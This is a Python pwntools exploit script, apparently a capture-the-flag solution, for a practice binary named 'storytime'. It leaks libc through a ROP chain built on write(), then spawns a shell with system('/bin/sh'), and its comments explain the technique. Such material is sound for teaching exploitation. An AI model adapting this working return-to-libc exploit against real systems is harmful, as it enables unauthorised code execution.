import struct
import pwn

# storytime is a 64 bit dynamically-linked binary
# NX is enabled, ASLR is turned on

# The nuance in this problem is that we only have write() to leak data
# We use write() to leak the got address of write() and defeat ASLR

target = pwn.process('./storytime')
# pwn.gdb.attach(target, gdbscript="b *0x40060e")

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
target_elf = pwn.ELF('storytime')

# write() takes three parameters:
	# 1) file descriptor (1 is std out) (rdi)
	# 2) buffer to write (rsi)
	# 3) number of bytes to write (rdx)

##############################
#### Gadgets we will need ####
##############################

# pop rsi:
# 0x0000000000400701: pop rsi; pop r15; ret;
pop_rsi = struct.pack("<Q", 0x400701)

# pop rdi:
pop_rdi = struct.pack("<Q", 0x400703)

# pop rdx:
# There are no great rdx gadgets: Will rely on the value in rdx being more than 8 (which should be the case)

# ret padding:
ret_padding = struct.pack("<Q", 0x400704)

##############################################
#### Leaking the address of write in libc ####
##############################################

write_plt = target_elf.symbols['write']
write_got = target_elf.got['write']

print(f"write plt: {hex(write_plt)} \nwrite got: {hex(write_got)}")

payload = b'a' * 56 # 56 bytes to buffer overflow
payload += pop_rsi
payload += struct.pack("<Q", write_got)
payload += struct.pack("<Q", 0x0) # This will be popped into r15 because of the nature of our pop_rsi gadget
payload += pop_rdi
payload += struct.pack("<Q", 0x1)
payload += struct.pack("<Q", write_plt)
payload += ret_padding
payload += struct.pack("<Q", 0x040062e) # Address of start of main() to loop back

target.recvuntil(b'story: \n')
target.sendline(payload)

leak = target.recv(8) # Receive 8 bytes (will be the address of write in libc)

# It is important to note why we are using recv(8) here instead of recvline().strip("\n") like we use when its a puts() call
# Its because write() doesn't terminate its writes with newlines unlike puts
# Knowing the semantics of the C functions you are dealing with is very important

leaked_write_addr = struct.unpack("<Q", leak)[0]
print(f"leaked write address in libc: {hex(leaked_write_addr)}")

#######################################################################################
#### Calculating libc base addr, acquiring useful addrs, and sending final payload ####
#######################################################################################

libc_write_offset = libc_elf.symbols['write']
libc_system_offset = libc_elf.symbols['system']
libc_bin_sh_offset = next(libc_elf.search(b'/bin/sh'))

libc_base_addr = leaked_write_addr - libc_write_offset

payload = b'a' * 56 # 56 bytes to buffer overflow
payload += pop_rdi
payload += struct.pack("<Q", libc_base_addr + libc_bin_sh_offset)
payload += ret_padding
payload += struct.pack("<Q", libc_base_addr + libc_system_offset)

target.recvuntil(b'story: \n')

target.sendline(payload)
target.interactive()

# Was failing on: <do_system+364> movaps ... [rsp+0x50] until I added ret padding after write got
# If you succesfully call system("/bin/sh") but then segfault in the call, it is probably because your stack alignment has been comprimised
